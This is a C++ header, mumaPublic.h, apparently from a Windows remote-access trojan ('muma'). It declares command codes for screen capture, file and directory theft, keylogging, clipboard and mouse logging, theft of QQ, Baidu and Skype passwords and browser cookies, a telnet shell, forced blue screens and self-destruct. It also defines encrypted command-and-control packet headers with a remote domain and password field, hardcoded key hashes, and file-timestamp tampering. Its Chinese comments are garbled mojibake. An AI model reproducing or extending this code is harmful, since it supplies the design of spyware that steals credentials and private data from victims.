// mumaPublic.h: interface for the mumaPublic class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_MUMAPUBLIC_H__E08F25F2_DABD_480E_A9A2_28EA0A144734__INCLUDED_)
#define AFX_MUMAPUBLIC_H__E08F25F2_DABD_480E_A9A2_28EA0A144734__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include <winsock2.h>
#include <time.h>
#include <lmcons.h>

#pragma warning(disable : 4786)

#include <list>
#include <vector>
using namespace std;
//4.MD5 ("sleuth2005") = 140e6c51de34288d312baff7bfbd480c
//ǰ8���ֽ�Ϊ ����ʶ
//��8���ֽ�Ϊ TEA������ TEA�ļ�������Ϊ16��

//New Md5("GETU@SDZW") = e0b975307d53662e22aaa4d070df6fe4
//ǰ8���ֽ�Ϊ ����ʶ
//��8���ֽ�Ϊ TEA������ TEA�ļ�������Ϊ16��

//////////////////////////////////////////////////////////////////////////
//
#define		TEA_ROUNDS		0x10
#define		TEA_DELTA		0x9E3779B9
#define		TEA_SUM			0xE3779B90
#define		SIZE_PACKET		800
#define		VERSION_TROJ	0x10 //�汾��
// �ڴ湲����С
#define		SIZE_SHAREMEM	2046
//��֧����չ��dll�����
#define		DLL_MAX_SIZE	256  
// SendData���ʵ��
#define		MAX_IDX_SENDDATA	20

#define PTYPE_SCREEN		2		// ����		(����/����)
#define PTYPE_LISTDIR		3		// ��Ŀ¼	(����/����)
#define PTYPE_COPYDIR		4		// ��ȡĿ¼	(����/����)
#define PTYPE_COPYFILE		5		// ��ȡ�ļ�	(����/����)
#define PTYPE_DESTORY		6		// ����ľ��	(ֲ������)
#define PTYPE_OLDISKINFO	7		// ����(Ŀ¼)��Ϣ�γ��ļ�
#define PTYPE_OPERAREG		8		// ע������(δ����)
#define PTYPE_UPFILE		9		// �ϴ��ļ�
#define PTYPE_RECENT		10		// ������ĵ��б�
#define PTYPE_DIRTREE		11		// ����Ŀ¼�ṹ�б�
#define PTYPE_CALLEXE		12		// ����ָ����������
#define PTYPE_STOPEXE		12		// ָֹͣ������
#define PTYPE_SYSINFO		13		// ��ȡϵͳ������Ϣ
#define PTYPE_CLIPBOARD		15		// ����������
#define	PTYPE_MOUSELOG		16		// ��������¼
#define	PTYPE_SETSNAPSCREEN		18		// �����Զ�����
#define		watchthread		17		// ���ӽ����߳�״̬
#define	PTYPE_SEARCHFILE		30		// ����Ŀ¼
#define PTYPE_ADJUSTSPEED	31		// ���������ٶ�
#define PTYPE_SEARCHCONTENT 32		// ȫ������

#define PTYPE_SETRECORD		39		// ����¼��״̬
#define PTYPE_QUERYFILESIZE	40		// ��ѯ�ļ���С(�Ƿ����)
#define PTYPE_SETCHECKDIR		41		// ���ü��Ŀ¼
#define PTYPE_GETCHECKDIRLIST	42		// ��ü��Ŀ¼�ļ��б�
#define PTYPE_USBDISKINFO	43  //��ȡu�̵���Ϣ
#define PTYPE_CHECKUSB		44		// ����Ƿ���������U��
#define PTYPE_GETMD5	45	//����Ҫ���ȡMD5
#define PTYPE_SETMD5FILTER 46	//����MD5����
#define PTYPE_GETMD5BYFILTER 47	//����MD5������ȡȫMD5
#define PTYPE_SETCUTVIDEO   50     //video cut Ƶ������
#define PTYPE_OTHERFILE		60

#define PTYPE_DELQQPASS		59		// ɾ��qq����

#define PTYPE_GETTHUMBNAIL	62		// �ش�����ͼ
#define PTYPE_SETTHUMBNAIL	61		// ��ȡ����ͼ

#define PTYPE_SETUPFILE		80		// �����ϴ��ļ�
#define PTYPE_UPCOPYFILE	81		// �ϴ��ļ�	
#define PTYPE_REUPFILE		82		// �ϴ������ش�

#define PTYPE_SETDATASTATE	90		// �������ݿ���
#define PTYPE_ADDFRUN		91		// �����ļ���������
#define PTYPE_ADDRUN		92		//	��������
#define PTYPE_SETTCPTRANS	93		//	����tcp����
#define PTYPE_PUTTROINFO	94		// ����mm��Ϣ 1-����
#define PTYPE_SETHEADSIGN	96		// ���ò��ű�ʾ
#define PTYPE_PUTRESERVEIP	97		// ���ñ���ip
#define PTYPE_GETALLGUID	99		// ������Թ��ܵĿ���״̬
#define PTYPE_ACKHEART		100		// ľ������ȷ�ϰ�
#define PTYPE_REGETFILE     101     // �ش��ļ�

#define PTYPE_PUTREMOTE     102     // ����Զ����Ϣ
#define PTYPE_FLUASHBUFFER  103     // ����ǰ�����е�����ͻ�����
#define PTYPE_AUTOSYSINFO	104		// �Զ���ȡϵͳ������Ϣ
#define PTYPE_ACKDELFILE	105		// ɾ���ļ�
#define PTYPE_BINDFILE		110		// ���ļ�
#define PTYPE_GETBAIDUPASS	111		// ����ѵõ��İٶ�HI������Ϣ
#define PTYPE_GETSKYPEPASS	112		// ����ѵõ���SKYPE������Ϣ
#define PTYPE_BSOD			121		// ����
#define PTYPE_TELNET		122		// telnet����
#define PTYPE_SYNCTELNET	123		// ͬ��telnet����

#define PTYPE_AUTOLANINFO	150		// �ش���������Ϣ
#define PTYPE_UPDATELAN		151		// ���¾�������Ϣ
#define PTYPE_INSTALLINFO	152		// ��װ�ļ��б���Ϣ

#define PTYPE_BROWSERINFO	153
#define PTYPE_BROWSERCOOKIE	155

#define PTYPE_GETREGEDIT	143

//170-179
#define PTYPE_SCREEN_START	170
#define PTYPE_SCREEN_STOP	171
#define PTYPE_SCREEN_UPDATE	172
#define PTYPE_SCREEN_FULL	173
#define PTYPE_SCREEN_MULUPDATE	174
#define PTYPE_SCREEN_MULUPDATE2	175

#define PTYPE_DISKINFO		191
#define PTYPE_PROCESSINFO	192
#define PTYPE_SOFTWAREINFO	193
#define PTYPE_INPUTINFO		194		//���뷨��Ϣ
#define PTYPE_HARDWARESTR	195
#define PTYPE_APPID			196
#define PTYPE_ADAPTER		197
#define PTYPE_LANINFO		198

#define DRIVER_IO_REMOTEIP		9900
#define DRIVER_IO_REMOTEADDR	9901
#define DRIVER_IO_DESTROY		9903
#define DRIVER_IO_EXECUTE		9904
#define DRIVER_IO_BSOD			9905

#define FIX_SCREEN			1
#define FIX_AUDIO			2
#define FIX_KEYLOG			3
#define FIX_MOUSE			4
#define FIX_DIRLIST			5
#define FIX_USBDIR			6
#define	FIX_USBFILE			7
#define FIX_MONITOR			8
#define	FIX_QQREC			9
#define FIX_CLIP			10
#define FIX_SKYPEAUDIO		11
#define FIX_SKYPESHOOT		12
#define FIX_MD5LIST			13
#define FIX_ANDROID			14
#define FIX_MD5FILTER		16
#define FIX_BROWSER			15
#define FIX_BROWSERCOOKIE	17
#define FIX_SYSTEMINFO		18
#define FIX_OTHERFILE		98
#define FIX_SCREENBAK		99

#define MAXCOUNT	100
#define MAXCOUNT2	20
#define HARDSTRLEN	500
#define APPIDLEN	500
#define ADAPTERLEN	1000
#define LANLEN		500
#define USBINFOLEN	300

//ľ������
extern int SignType;

typedef struct _REMOTEINFO_
{
	char remark[50];
	char remotedomain[MAX_PATH];
	char password[50];
	char troinfo[300];
	DWORD remoteIP;
	DWORD ReserveIp;
	DWORD HeadSign;
	_REMOTEINFO_()
	{
		remoteIP = 0;
		ReserveIp = 0;
		HeadSign = 0;
		memset(remark, 0, sizeof(remark));
		memset(remotedomain, 0, sizeof(remotedomain));
		memset(password, 0, sizeof(password));
		memset(troinfo, 0, sizeof(troinfo));
	}
}RemoteInfo, *pRemoteInfo;

char *DepubStringA(char *ret_string, int strlen, char *string);

char *DeFileStringA(char *ret_string, int strlen, char *string);

WCHAR *DeFileStringW(WCHAR *ret_string, int strlen, WCHAR *string);

char *DeRunStringA(char *ret_string, int strlen, char *string);

char *DeProcessStrA(char *ret_string, int strlen, char *string);

char *SysinfStringA(char *ret_string, int strlen, char *string);

char *GetTmpPrevFix(int type);
int GetFatAutoSendID();
BOOL MD5TranFile(char* pmd5, const WCHAR * filename);
//�������ļ���MD5
BOOL MD5TranFile1(char* pmd5, const WCHAR * filename);
//���ļ�ָ��λ�õ�MD5
BOOL MD5TranFile2(char* pmd5, const WCHAR * filename, int begpos, int endpos);
//��ǰ1K����1K���ӳ��ȵ�MD5
BOOL MD5TranFile3(char* pmd5, const WCHAR * filename);

BOOL	GetTroPath(char *path);
BOOL GetTroPathW(WCHAR *path);

 // �޸��ļ���Ŀ¼��ʱ��, offHourƫ��Сʱ, offMinuteƫ�Ʒַ��� 
BOOL ModifyFileTime(LPCSTR pathname, int offHour = 0, int offMinute = 5);

void RemoteFileContent(LPCSTR filepath, char* p, DWORD& plen, BOOL bGet);

BOOL SetRemoteInfo(char *pbuf, int len, int type, char *tropath);

BOOL GetRemoteInfo(pRemoteInfo rinfo);

void GetDataState(char *spyaddr,int spyaddrlen, bool bCrypt);

BOOL NewGetRemoteInfo(pRemoteInfo &rinfo, char *tropath);
/*!
  \fn ULONG	GetVirtualServerIp();
  \brief �õ�����ip
  \param 
  \param 
  \return
  ������ϸ
*/
ULONG	GetVirtualServerIp();				
/*!
  \fn BOOL BufferDecrypt(char * buff,int len,int offest);
  \brief ����
  \param 
  \param 
  \return
  ������ϸ
*/
BOOL BufferDecrypt(char * buff,int len,int offest);
/*!
  \fn BOOL BufferEncrypt(char * buff,int len,int offest);
  \brief  ����
  \param 
  \param 
  \return
  ������ϸ
*/
BOOL BufferEncrypt(char * buff,int len,int offest);

char * GetFormatIP(const char * szIP);

int		LineParser(char * inputline,char ** nextline,char **field,char ** value);

BOOL	DbgFat32Log(const char* fm, ...);
/*!
  \fn void	BootNTRemove(char* filename);
  \brief //NT����ɾ��
  \param 
  \param 
  \return
  ������ϸ
*/
void BootNTRemove(const char* filename);		
void BootNTRemoveW(const WCHAR * filename);
void BootMoveFile(char* filename,char* dstname);
void BootMoveFileW(WCHAR* filename,WCHAR* dstname);


 
// ��ȡ�ļ�
int GetFileContent(char* filename,DWORD& pbuffer,DWORD& datalen);

//////////////////////////////////////////////////////////////////////////
//
struct SendPacketHead {
	CHAR PFlag[8];
	ULONG TroNo;
	UCHAR TroType;
	UCHAR PacketType;
	UCHAR TroVersion;
	UCHAR retain;
};

#define SENDPACKETHEADLEN 16

struct MumaHead{
	USHORT	datalen;	//	���ݳ���		2Byte			;�ڴ��ʽ
	USHORT	SessionID;	//					2Byte			;�ڴ��ʽ
	USHORT	PacketSeq;	//	�����			2Byte			;�ڴ��ʽ
	CHAR	TranFlg;	//	���ݴ����־	1Byte
	CHAR	retain;		//	����			1Byte
};

class Line{
public:
	UINT slen;
	char line[2000];
};
typedef list<Line, allocator<Line> > LineList ;
//Define an iterator for template class list of ints
typedef LineList::iterator LineListIt ;
//////////////////////////////////////////////////////////////////////////
typedef WINADVAPI
BOOL	(CALLBACK *pMOVEFILEFUN)(
								const char * srcFile,
								const char * dstFile,
								DWORD dwFlag); 

typedef WINADVAPI
BOOL	(CALLBACK *pMOVEFILEFUNW)(
								  LPCWSTR srcFile,
								  LPCWSTR dstFile,
								  DWORD dwFlag); 

void CryptRemoteInfo(char* p, int len);

BOOL QueryRegValueF(HKEY hRoot, const char * szSubKey, const char * szName, /*out*/char* szPath, /*out*/DWORD& buflen);

DWORD MakeHeadBuff(char *hdrBuf, int &offMumaHead, UCHAR PacketType);

//////////////////////////////////////////////////////////////////////////
//rc4
struct rc4_state
{
    int x, y, m[256];
};

void rc4_setup( struct rc4_state *s, unsigned char *key,  int length );
void rc4_crypt( struct rc4_state *s, unsigned char *data, int length );

//////////////////////////////////////////////////////////////////////////
//

int Unicode2GB2312(WCHAR* wsunicode,char* buffer,int buflen);
int Unicode2UTF_8(WCHAR* wsunicode,char* buffer,int buflen);
int GB23122Unicode(char*gb2312, WCHAR* wsz, int len);
int UTF_82Unicode(char*utf8, WCHAR* wszUtf8, int len);

int Utf82Gb(const char * p, int len, char * buf, int buflen);
int Gb2Utf8(const char * p, int len, char * buf, int buflen);

int LineParser2(char * inputline,char ** nextline,char **field,char ** value);

BOOL myGetModuleFile(WCHAR * SelfPath, DWORD PathLen, WCHAR * SelfName, DWORD NameLen);

void *mymemcpy(void *des, const void *src, size_t len);

typedef struct _para_
{
	char* value;
	int len;
	_para_()
	{
		value=0;
		len=0;
	}
}Para,*lpPara;

void Split(char* buf,int len,char* e,Para * parray,int& count);

bool Split(const char* buf, int len, char* e, vector<string>& parray, bool bLastField = false);

BOOL CreateFileName(LPCSTR m_type, LPSTR filename, LPSTR filea);
BOOL myWriteFile(char *buf, int buflen, LPSTR browserfilename, LPSTR browserfilea);
BOOL WriteCyFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite);
BOOL WriteCyFile(LPCSTR filename, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite);
BOOL Decode2(char*buf,DWORD& len);

char * GetUtf8WindowTitle();

BOOL GetAppDataPath(char *path);
BOOL GetLocalAppDataPath(char *path);

void WriteDbgLogEx(const char *fm, ...);

extern BOOL g_isHeartOk;
#endif // !defined(AFX_MUMAPUBLIC_H__E08F25F2_DABD_480E_A9A2_28EA0A144734__INCLUDED_)
